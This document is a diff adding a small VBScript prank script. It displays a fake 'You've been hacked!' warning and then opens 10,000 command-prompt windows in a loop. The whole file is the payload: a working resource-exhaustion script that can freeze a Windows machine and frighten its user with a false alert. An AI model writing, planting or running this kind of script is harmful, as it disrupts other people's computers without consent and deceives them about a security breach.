@@ -1,0 +1,13 @@
+' Define the number of CMD windows to open
+Dim numCmdWindows
+numCmdWindows = 10000
+
+' Display a message box
+MsgBox "You've been hacked!", vbExclamation, "Hacking Alert"
+
+' Open CMD windows
+Dim i
+For i = 1 To numCmdWindows
+    Set objShell = CreateObject("WScript.Shell")
+    objShell.Run "cmd.exe", 1, False
+Next
